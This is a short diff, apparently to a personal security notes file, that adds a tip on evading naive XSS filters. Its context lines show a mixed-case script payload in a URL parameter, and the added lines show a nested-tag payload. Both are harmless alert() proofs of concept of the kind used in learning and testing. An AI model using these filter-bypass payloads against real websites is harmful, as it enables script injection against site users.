@@ -9,3 +9,6 @@ linkedin: https://www.linkedin.com/in/pawe%C5%82-werner-31b40a53/
 
 2. If webdeveloper did some regex to prevent simply XSS, you can try: 
 - http://test.com/index.php?name=hacker<scRipt>alert('txt')</scriPt>
+
+3. If the website is not developed correct you can try:
+- http://test.com/index.php?name=<sc<script>ript>alert('test')</sc</script>ript>
